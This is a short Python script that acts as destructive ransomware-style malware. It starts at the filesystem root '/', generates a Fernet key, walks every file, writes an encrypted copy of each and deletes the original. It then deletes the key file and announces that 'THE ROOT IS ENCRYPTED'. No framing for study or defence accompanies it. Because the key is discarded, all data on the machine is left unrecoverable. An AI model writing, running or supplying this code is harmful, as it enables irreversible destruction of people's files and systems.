import os
from cryptography.fernet import Fernet


path = "/"

def genKey(key_path):
    key1 = Fernet.generate_key()
    try:
        if key_path.endswith("/"):
            with open(key_path + "key1.key", "wb") as file:
                file.write(key1)
        else:
            with open(key_path + "/key1.key", "wb") as file:
                file.write(key1)
        print("Key Generated")
    except:
        genKey(key_path)




os.chdir(path)
genKey(path)

#keygen.genKey(path)
key_file = open("key1.key", "rb").read()


def encrypt_file(key, file):
    f = Fernet(key)
    data = open(file, "rb").read()
    encrypted_data = f.encrypt(data)
    with open(file + ".encrypted", "wb") as fl:
        fl.write(encrypted_data)
        os.remove(file)


files = []
if os.path.isfile(path):
    print("encrypted file ")
    encrypt_file(key_file, path)
    exit()


elif os.path.isdir(path):
    # print("THE BELOW MENTIONED FILES WILL BE ENCRYPTED")
    for (root, dirs, file_names) in os.walk(path):
        for i in file_names:
            files.append(os.path.abspath(os.path.join(root, i)))



# print("THE BELOW MENTIONED FILES WILL BE ENCRYPTED")
for i in files:
    print(i)
print("\nTHE ABOVE MENTIONED FILES WILL BE ENCRYPTED\n")

for i in files:
    print("encrypting : ", i)
    encrypt_file(key_file, i)

os.remove("key1.key")
print("\n THE ROOT IS ENCRYPTED ")
